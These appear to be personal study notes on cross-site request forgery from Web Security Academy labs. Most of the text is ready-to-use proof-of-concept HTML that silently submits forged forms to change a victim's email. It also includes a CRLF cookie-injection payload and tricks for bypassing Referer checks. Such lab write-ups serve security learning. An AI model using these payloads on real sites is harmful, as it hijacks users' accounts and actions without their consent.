# CSRF - Cross-site request forgery

## Description

Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker 
to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, 
which is designed to prevent different websites from interfering with each other.

### CSRF vulnerability with no defenses
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
  <form method="$method" action="$url"> //default method "get"
  <input type="hidden" name="$param1name" value="$param1value">
  </form>
  <script>
     document.forms[0].submit();
  </script>
  </body>
</html>
```
### CSRF where token validation depends on request method

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a4200f70356384ec05f0126004900e9.web-security-academy.net/myaccount" method="POST">
      <input type="hidden" name="email" value="aaa&#64;exploit&#45;0a2c009c030f3802c0de01d501bb0026&#46;web&#45;security&#45;academy&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
### CSRF where token validation depends on token being present

Making a request, such as changing email or other kinds of actions, try to remove the CSRF token.
If it works, generate the PoC from Burp Suite

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
  <form action="$url"> //default method "get"
  <input type="hidden" name="$param1name" value="$param1value">
  </form>
  <script>
     document.forms[0].submit();
  </script>
  </body>
</htm l>
```
## CSRF where token is not tied to user session

Try a PoC with the CSRF  unused from the html page and create a PoC to be delivered

## CSRF where token is tied to non-session cookie

In this case, you can find a csrfKey in the cookie, hopefully you can set it thouh this type of request
/?search=test%0d%0aSet-Cookie:%20csrfKey=your-key

On the PoC, remove the block script and use this <img src="$cookie-injection-url" onerror="document.forms[0].submit()">

This was possible because the search request allow to set cookie and with that request we change the value of fake.
With <img src=> you can do almost anything even setting a cookie if in the request is allow.%2f%6e%2f%72

PoC
HTTP/1.1 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrf=fake; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 3334


In case there is a control in the refferer, try to control if it is no inserted what happen.
In a positive case insert this to avoid the refferer

Insert it into the html
<meta name="referrer" content="no-referrer">



If you still have to face the referrer, try to push in hte history the original url, if you have still problem, add in the head of the exploit server this:

Referrer-Policy: unsafe-url

Body example

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/?0a90000e0350a410c02c557100b40056.web-security-academy.net/')</script>
    <form action="https://0a90000e0350a410c02c557100b40056.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;dontwannacry&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>


